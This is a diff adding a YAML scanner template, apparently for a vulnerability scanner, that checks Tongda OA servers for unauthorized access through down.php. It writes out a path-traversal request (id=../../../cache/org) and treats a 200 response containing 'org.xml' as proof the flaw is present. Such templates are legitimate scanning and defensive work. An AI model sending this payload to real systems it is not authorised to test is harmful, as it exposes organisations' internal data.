@@ -1,0 +1,12 @@
+name: 通达OA-down.php-unauthorized-access
+description: >-
+  未授权访问
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /inc/package/down.php?id=../../../cache/org
+    expression:
+      status: 200
+      body_all:
+        - "org.xml"
